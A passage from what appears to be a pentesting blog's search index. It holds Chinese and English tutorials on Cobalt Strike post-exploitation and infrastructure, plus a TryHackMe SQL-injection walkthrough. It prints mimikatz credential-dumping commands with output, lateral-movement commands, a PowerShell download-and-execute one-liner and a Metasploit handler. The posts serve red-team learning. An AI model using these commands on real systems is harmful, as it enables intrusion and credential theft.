elevated context. This attack relies on a COM object that automatically elevates from certain process contexts (Microsoft signed, lives in c:\\windows*). ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:9","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Mimikatz 在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式： mimikatz [module::command] \u003cargs\u003e 运行 mimikatz 命令 mimikatz [!module::command] \u003cargs\u003e 强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。 mimikatz [@module::command] \u003cargs\u003e 使用当前 Beacon 的访问令牌运行 mimikatz 命令 下面是一些mimikatz命令。 !lsadump::cache 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希 !lsadump::sam 获取本地账户密码哈希，该命令与 hashdump 比较类似 misc::cmd 如果注册表中禁用了 CMD ，就重新启用它 !misc::memssp 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\\windows\\system32\\mimilsa.log”中 misc::skeleton 该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。 process::suspend [pid] 挂起某个进程，但是不结束它 process::resume [pid] 恢复挂起的进程 以上的这些只是mimikatz能做事情的一小部分，下面看看!misc::memssp的使用。 mimikatz !misc::memssp cd C:\\Windows\\system32 shell dir mimilsa.log shell type mimilsa.log 详细运行过程： 首先运行mimikatz !misc::memssp beacon\u003e mimikatz !misc::memssp [*] Tasked beacon to run mimikatz's !misc::memssp command [+] host called home, sent: 1006151 bytes [+] received output: Injected =) 接下来来到C:\\Windows\\system32目录 beacon\u003e cd C:\\Windows\\system32 [*] cd C:\\Windows\\system32 [+] host called home, sent: 27 bytes beacon\u003e shell dir mimilsa.log [*] Tasked beacon to run: dir mimilsa.log [+] host called home, sent: 46 bytes [+] received output: 驱动器 C 中的卷没有标签。 卷的序列号是 BE29-9C84 C:\\Windows\\system32 的目录 2020/07/23 21:47 24 mimilsa.log 1 个文件 24 字节 0 个目录 17,394,728,960 可用字节 可以看到是存在mimilsa.log文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。 查看mimilsa.log文件内容。 beacon\u003e shell type mimilsa.log [*] Tasked beacon to run: type mimilsa.log [+] host called home, sent: 47 bytes [+] received output: [00000000:000003e5] \\ [00000000:002b99a7] WIN-75F8PRJM4TP\\Administrator Password123! 成功获取到当前登录用户的明文密码。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:10","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Credential and Hash Harvesting 需要在管理员权限的session下执行。 想要获取凭证信息，可以在管理员权限的会话处右击选择Access --\u003e Dump Hashes，或者在控制台中使用hashdump命令。 想获取当前用户的密码，可以运行mimikatz，右击管理员权限会话选择Access --\u003e Run Mimikatz，或在控制台运行logonpasswords命令。 在View --\u003e Credentials下可以查看到hashdump与mimikatz获取的数据。 To dump hashes, go to [beacon] -\u003e Access -\u003e Dump Hashes. You can also use the hashdump [pid] [x86|x64] command from the Beacon console to inject the hashdump tool into the specified process. Use hashdump (without [pid] and [arch] arguments) to spawn a temporary process and inject the hashdump tool into it. These commands will spawn a job that injects into LSASS and dumps the password hashes for local users on the current system. This command requires administrator privileges. If injecting into a pid that process requires administrator privileges. Use logonpasswords [pid] [arch] to inject into the specified process to dump plaintext credentials and NTLM hashes. Use logonpasswords (without [pid] and [arch] arguments) to spawn a temporary process to dump plaintext credentials and NTLM hashes. This command uses mimikatz and requires administrator privileges. Use dcsync [pid] [arch] [DOMAIN.fqdn] \u003cDOMAIN\\user\u003e to inject into the specified process to extract the NTLM password hashes. Use dcsync [DOMAIN.fqdn] \u003cDOMAIN\\user\u003e to spawn a temporary process to extract the NTLM password hashes. This command uses mimikatz to extract the NTLM password hash for domain users from the domain controller. Specify a user to get their hash only. This command requires a domain administrator trust relationship. Use chromedump [pid] [arch] to inject into the specified process to recover credential material from Google Chrome. Use chromedump (without [pid] and [arch] arguments) to spawn a temporary process to recover credential material from Google Chrome. This command will use Mimikatz to recover the credential material and should be run under a user context. Credentials dumped with the above commands are collected by Cobalt Strike and stored in the credentials data model. Go to View -\u003e Credentials to pull up the credentials on the current team server. ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:11","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Port Scanning portscan：进行端口扫描，使用参数为：portscan [targets] [ports] [discovery method]。 目标发现discovery method有三种方法，分别是：arp、icmp、none，arp方法使用 ARP 请求来发现一个主机是否存活。icmp方法发送一个 ICMP echo 请求来检查一个目标是否存活。none选项让端口扫描工具假设所有的主机都是存活的。 端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。 右击 Beacon会话，在Explore --\u003e Port Scan中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。 ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:12","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Network and Host Enumeration Beacon的net模块提供了在Windows域环境下目标发现的工具。 Use net [pid] [arch] [command] [arguments] to inject the network and host enumeration tool into the specified process. Use net [command] [arguments] (without [pid] and [arch] arguments) to spawn a temporary process and inject the network and host enumeration tool into it. An exception is the net domain command which is implemented as a BOF.net domain. The commands in Beacon’s net module are built on top of the Windows Network Enumeration APIs. Most of these commands are direct replacements for many of the built- in net commands in Windows (there are also a few unique capabilities here as well). The following commands are available: computers - lists hosts in a domain (groups) dclist - lists domain controllers. (populates the targets model) domain - display domain for this host domain_controllers - lists DCs in a domain (groups) domain_trusts - lists domain trusts group - lists groups and users in groups localgroup - lists local groups and users in local groups. (great during lateral movement when you have to find who is a local admin on another system). logons - lists users logged onto a host sessions - lists sessions on a host share - lists shares on a host user - lists users and user information time - show time for a host view - lists hosts in a domain (browser service). (populates the targets model) ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:13","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"Lateral Movement Once you have a token for a domain admin or a domain user who is a local admin on a target, you may abuse this trust relationship to get control of the target. Cobalt Strike’s Beacon has several built-in options for lateral movement. Type jump to list lateral movement options registered with Cobalt Strike. Run jump [module] [target] [listener] to attempt to run a payload on a remote target. Post Exploitation / Lateral Movement Jump Module Arch Description psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Run remote-exec, by itself, to list remote execution modules registered with Cobalt Strike. Use remote-exec [module] [target] [command + args] to attempt to run the specified command on a remote target. Post Exploitation / Lateral Movement GUI Remote-exec Module Description Description psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI Lateral movement is an area, similar to privilege escalation, where some attacks present a natural set of primitives to spawn a session on a remote target. Some attacks give an execute-primitive only. The split between jump and remote-exec gives you flexibility to decide how to weaponize an execute-only primitive. Aggressor Script has an API to add new modules to jump and remote-exec. See the Aggressor Script documentation (the Beacon chapter, specifically) for more information. Cobalt Strike also provides a GUI to make lateral movement easier. Switch to the Targets Visualization or go to View -\u003e Targets. Navigate to [target] -\u003e Jump and choose your desired lateral movement option. The following dialog will open: First, decide which trust you want to use for lateral movement. If you want to use the token in one of your Beacons, check the Use session’s current access token box. If you want to use credentials or hashes for lateral movement—that’s OK too. Select credentials from the credential store or populate the User, Password, and Domain fields. Beacon will use this information to generate an access token for you. Keep in mind, you need to operate from a high integrity context [administrator] for this to work. Next, choose the listener to use for lateral movement. The SMB Beacon is usually a good candidate here. Last, select which session you want to perform the lateral movement attack from. Cobalt Strike’s asynchronous model of offense requires each attack to execute from a compromised system. There is no option to perform this attack without a Beacon session to attack from. If you’re on an internal engagement, consider hooking a Windows system that you control and use that as your starting point to attack other systems with credentials or hashes. Press Launch. Cobalt Strike will activate the tab for the selected Beacon and issue commands to it. Feedback from the attack will show up in the Beacon console. Other Commands Beacon has a few other commands not covered above. The clear command will clear Beacon’s task list. Use this if you make a mistake. Type exit to ask Beacon to exit. Use kill [pid] to terminate a process. Use timestomp to match the Modified, Accessed, and Created times of one file to those of another file. ","date":"2024-01-15","objectID":"/2024/01/cobalt_strike_basic_no.2/:2:14","tags":["C2"],"title":"Cobalt Strike Basic No.2 -- Attack and Post Exploitation","uri":"/2024/01/cobalt_strike_basic_no.2/"},{"categories":["Pentesting"],"content":"CS基础知识记录","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"Cobalt Strike的组织架构和基础设施介绍。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:0:0","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"一、基础操作 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:0","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"简介 Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。 Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:1","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"组织结构 Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。 文件目录结构如下： ┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1] └─$ tree -L 2 . . ├── Client │ ├── cobaltstrike.auth │ ├── cobaltstrike-client.cmd -- Windows client启动文件 │ ├── cobaltstrike-client.jar -- client启动jar文件 │ ├── cobaltstrike-client.sh -- Linux/MacOS client启动文件 │ └── uHook.jar └── Server ├── c2lint -- 检查profile的错误和异常 ├── cobaltstrike.auth ├── cobaltstrike.store -- server和client加密通信的证书 ├── data ├── downloads -- 文件下载目录 ├── logs -- 日志目录 ├── screenshots -- 截图目录 ├── source-common.sh ├── teamserver -- server启动脚本 ├── TeamServerImage -- 实际的启动elf文件 └── third-party -- 第三方工具 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:2","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"连接方式 Cobalt Strike的client想要连接server需要知道三个信息： server的外部ip地址 serve的连接密码 (optional)决定malleable C2工具的哪一个配置文件用于server 开启server 开启server的常规命令如下（Linux环境）： ./teamserver your_ip your_password [config_file] ┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Server] └─$ sudo ./teamserver 172.16.86.138 v4ler1an [sudo] password for v4ler1an: [*] Will use existing X509 certificate and keystore (for SSL) [*] Starting teamserver [*] Team Server Version: 4.9.1 (Pwn3rs) [*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3 ... ... [+] Team server is up on 0.0.0.0:50050 [*] SHA256 hash of SSL cert is: xxxx [+] Listener: test started! client连接server client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下: ┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Client] └─$ ls cobaltstrike.auth cobaltstrike-client.cmd cobaltstrike-client.jar cobaltstrike-client.sh uHook.jar 直接运行对应的文件即可。 点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面： 成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。 client连接不同的server Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。 连接不同的server，在client的左上角的+号，输入server信息即可连接： 此时在最下方就会有多个server连接的切换条。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:3","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"分布式协作 这里以最基本的团队模型为例，涉及三个server： Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。 Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。 Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。 可伸缩红队操作模型 Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。 目标单元的工作： 负责具体目标或行动的对象 获得访问权限、后渗透、横向移动 维护本地基础设施 访问管理单元的工作： 保持所有目标网络的访问权限 获取访问权限并接收来自单元的访问 根据需要传递对目标单元的访问 为持续回调保持全局基础环境 团队角色 初始渗透人员，主要任务是进入目标系统，并扩大立足点 后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息 权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:4","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"日志与报告 日志记录 Cobalt Strike的日志文件在团队服务器下的运行目录中的logs文件夹内，其中有些日志文件名例如beacon_11309.log，这里的11309就是beacon会话的ID。 按键的日志在keystrokes文件夹内，截屏的日志在screenshots文件夹内，截屏的日志名称一般如screen_015321_4826.jpg类似，其中015321表示时间（1点53分21秒），4826表示ID。 导出报告 Cobalt Strike生成报告的目的在于培训或帮助蓝队，在Reporting菜单栏中就可以生成报告，关于生成的报告有以下特点： 输出格式为PDF或者Word格式 可以输出自定义报告并且更改图标（Cobalt Strike –\u003e Preferences –\u003eReporting） 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。 报告类型 活动报告（Activity Report） 提供红队活动的时间表，记录了每个后渗透活动。 主机报告（Hosts Report） 汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。 入侵指标报告（Indicators of Compromise） 包括对C2扩展文件的分析、使用的域名和上传文件的md5。 会话报告（Sessions Report） 记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。 社工报告（Social Engineering Report） 记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。 TTP报告（Tactics，Techniques，and Procedures） 将自己的CS行动与ATT\u0026CK矩阵进行映射，给出具体的ttp。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:1:5","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"二、基础设施 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:0","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"Listener管理 定义：等待受害目标回连自己的一个服务。 作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。 一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成： // 操作系统/攻击载荷/传输器 Operating System/Payload/Stager example: windows/beacon_http/reverse_http Stager payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。 stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。 为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。 创建Listener 在CS的client中打开Cobalt Strike -\u003e Listeners，之后点击下方的Add，弹出New Listener窗口： CS的listener目前有三种类型： Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下： windows/beacon_http/reverse_http Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener： windows/foregin/reverse_https External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:1","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"HTTP和HTTPS Beacon Beacon Beacon是CS的Payload Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。 通过HTTP、HTTPS和DNS出口网络 使用SMB协议的时候是点对点通信 Beacon有很多的后渗透攻击模块和远程管理工具 Beacon的类型 HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。 windows/beacon_http/reverse_http windows/beacon_https/reverse_https DNS Beacon windows/beacon_dns/reverse_dns_txt windows/beacon_dns/reverse_http SMB Beacon SMB Beacon也可以叫做pipe beacon windows/beacon_smb/bind_pipe 创建HTTP Beacon 点击 Cobalt Strike –\u003e Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。 测试一下刚才设置的监听器，点击Attack –\u003e Web Drive-by –\u003e Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch: 复制弹窗中的命令到靶机中执行： powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.16.86.138:80/test'))\" 回到CS，靶机已经上线： HTTPS Beacon HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:2","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"DNS Beacon 使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。 在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。 DNS Beacon的工作流程具体如下： 首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。 原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。 根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。 域名配置 既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图） 配置完可以使用nslookup进行测试 CS中创建监听器时填写NS记录的域名： 靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:3","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"SMB Beacon SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。 因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。 SMB Beacon配置 首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可： 然后在初始beacon中迁移到smb beacon： 迁移完成后： 可以看到派生的SMB Beacon，在external的ip后有个∞∞字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。 随后，我们把SMB Beacon注入到一个进程中： 注入完成后，SMB Beacon就转变为对应进程派生的beacon了： 如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。 ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:4","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"TCP Beacon TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。 在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接： ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:5","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"Foreign Beacon 使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。 首先在msf中起一个监听器： msf \u003e use exploit/multi/handler msf exploit(handler) \u003e set payload windows/meterpreter/reverse_https payload =\u003e windows/meterpreter/reverse_https msf exploit(handler) \u003e set lhost 10.211.55.2 lhost =\u003e msf ip msf exploit(handler) \u003e set lport 4444 lport =\u003e 4444 msf exploit(handler) \u003e exploit 然后在cs里配置，填上msf的ip和监听端口。 然后选择会话右键派生，会话选择forign beacon： 随后在msf中就会接收到会话： ","date":"2024-01-11","objectID":"/2024/01/cobalt_strike_basic_no.1/:2:6","tags":["C2"],"title":"Cobalt Strike Basic No.1 -- Basic and Infrastructure Management","uri":"/2024/01/cobalt_strike_basic_no.1/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Offensive Pentesting – Game Zone walkthrough. THM – Offensive Pentesting – Game Zone ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:0:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Deploy the vulnerable machine ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:1:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What is the name of the large cartoon avatar holding a sniper on the forum? 直接使用图片搜索：agent 47 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:1:1","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Obtain access via SQLi ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:2:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"When you’ve logged in, what page do you get redirected to? 使用登录功能，先抓包看下通信数据： 理论上，没有防护的情况下，可以尝试一下爆破username和password参数。这里我们还要测试一下，看看有没有过滤特殊字符串，响应一样，判断不出来。那就尝试sql注入： username处存在字符型注入，后续我们可以考虑使用这个sql注入来获取权限。 所以答案就是portal.php。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:2:1","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Using SQLMap 上面发现了一个sql注入漏洞，那么现在就可以使用这个漏洞来往下进行了，这里使用的工具是sqlmap。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:3:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"In the users table, what is the hashed password? burp抓包请求，拿到请求内容： 然后上sqlmap： 数据库是mysql，参数searchitem存在sql注入漏洞。接下来直接dump数据库的表： 答案是users表中的pwd的hash。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:3:1","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What was the username associated with the hashed password? agent47 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:3:2","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What was the other table name? post ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:3:3","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Cracking a password with JohnTheRipper 在上面拿到了密码，下面可以尝试进行解密密码。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:4:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What is the de-hashed password? ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat hash.txt ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256 Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x]) Warning: poor OpenMP scalability for this hash type, consider --fork=4 Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status videogamer124 (?) 1g 0:00:00:00 DONE (2024-03-19 04:32) 5.882g/s 17347Kp/s 17347Kc/s 17347KC/s vimivi..vainlove Use the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliably Session completed. ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:4:1","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What is the user flag? 直接用户名密码ssh登录. ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:4:2","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Exposing services with reverse SSH tunnels 使用ssh建立反向代理隧道： ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:5:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"How many TCP sockets are running? agent47@gamezone:~$ netstat -antpul|grep LISTEN (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 